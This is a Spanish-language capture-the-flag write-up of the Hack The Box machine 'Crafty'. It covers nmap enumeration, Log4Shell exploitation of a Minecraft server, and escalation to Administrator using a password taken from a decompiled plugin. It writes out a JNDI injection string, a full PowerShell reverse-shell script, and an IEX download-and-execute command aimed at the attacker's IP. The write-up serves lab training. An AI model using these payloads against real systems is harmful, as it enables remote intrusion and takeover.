---
title: "Crafty - WriteUp"
date: Wed Mar 05 2025 15:15:00 GMT+0100 (Central European Standard Time)
categories: [WriteUps, HTB, Windows]
tags: [ctf, nmap, htb, reverse-shell, cve, exploit, cve-2021-44228, windows, iis, powershell]
image: /assets/img/htb-writeups/Pasted-image-20240212104706.png
---

{% include machine-info.html
  machine="Crafty"
  os="Windows"
  difficulty="Easy"
  platform="HTB"
%}

![Crafty](/assets/img/htb-writeups/Pasted-image-20240212104706.png)

---

---
-----
![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212104706.png)

------

#### ENUM

NMAP
```BASH
# Nmap 7.94SVN scan initiated Mon Feb 12 10:08:10 2024 as: nmap -sCV -p 80,25565 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootst
rap.xsl -oN targeted -oX targetedXML 10.129.222.18
Nmap scan report for 10.129.222.18
Host is up (0.043s latency).

PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 12 10:08:24 2024 -- 1 IP address (1 host up) scanned in 14.17 seconds
```

Redirige a crafty.htb por lo que lo damos de alta en el archivo hosts.

HTTP
![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212105245.png)

Descubrimos un subdominio y lo damos de alta también en el archivo hosts.

#### EXPLOTACIÓN

Buscando vulnerabilidades sobre Minecraft server 1.16.5 descubrimos el CVE-2021-44228.
Y de ahí a varios POC. Clonamos los siguientes repos
https://github.com/kozmer/log4j-shell-poc
https://github.com/ammaraskar/pyCraft

Del repo de kozmer:

Editamos el archivo _poc.py_ de la siguiente manera ya que la máquina víctima es Windows...

![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212113713.png)

Descargamos el JDK de JAVA necesario para este exploit:

```bash
$ wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
```

Lo descomprimimos y renombramos la carpeta como nos indica el exploit:

```bash
$ tar -zxf jdk-8u181-linux-x64.tar.gz
...
$ mv jdk1.8.0_181 jdk1.8.0_20
```

Nos ponemos en escucha por el puerto 9001 (con rlwrap delante porque esperamos una consola Windows)

```bash
$ rlwrap nc -lnvp 9001
```

Y ahora ejecutamos el script que nos levantará un servidor LDAP:
Mi IP en tun0 es la 10.10.14.87

```shell
$ python3 poc.py --userip 10.10.14.87 --webport 4243 --lport 9001
```

![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212115516.png)

Ahora vamos al repo de ammaraskar:

Entramos en la caprte pyCraft

Creamos un entorno virtual aislado para instalar las dependencias del requirements.txt

```bash
$ python3 -m venv pycraft
$ source pycraft/bin/activate
```

Ahora sí ejecutamos el exploit:

```bash
$ python3 start.py
Enter your username: 1
Enter your password (leave blank for offline mode): 
Enter server host or host:port (enclose IPv6 addresses in square brackets): 10.129.222.18
Connecting in offline mode...
Connected.
${jndi:ldap://10.10.14.87:1389/a}
```

Nos vamos a la consola en escucha y...

![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212121252.png)

Estamos dentro...

#### ESCALADA

Registramos bandera de usuario y continuamos.

En la carpeta server/plugins encontramos un archivo .jar llamado _playercounter-1.0-SNAPSHOT.jar_ nos lo pasamos a nuestra máquina y lo abrimos con cualquier decompiler de Java. En mi caso voy a usar _jd-gui_:

```bash
$ jd-gui playercounter-1.0-SNAPSHOT.jar
```

Nos vamos a htb.crafty.playercounter > Playercounter > Playercounter() y vemos un string cifrado o contraseña de una conexión interna en el puerto 27015. La copiamos y seguimos.

![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212130607.png)

```http
s67u84zKq8IXw
```

Vamos a probar estas credenciales con el usuario Administrator para enviar otra consola remota.

Creamos un archivo PS1 que nos enviará la reverse shell, en mi caso lo he llamado _shell.ps1_

```PowerShell
$LHOST = "10.10.14.87"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Levantamos un servidor http con Python para que el próximo script lo localice y lo ejecute:
```bash
$ rlwrap nc -nlvp 4444
```

Ahora nos vamos a la consola de la máquina víctima y vamos ejecutando lo siguiente línea por línea:

```PowerShell
> powershell
> $secpass = ConvertTo-SecureString 's67u84zKq8IXw' -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential('Administrator',$secpass)
> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.87/shell.ps1')" -Credential $cred
```

Nos vamos a la consola que habíamos puesto en escucha por el puerto 4444 y...

![CRAFTY](/assets/img/htb-writeups/Pasted-image-20240212135608.png)

Máquina conseguida!
---

**Última actualización**: 2025-03-05<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
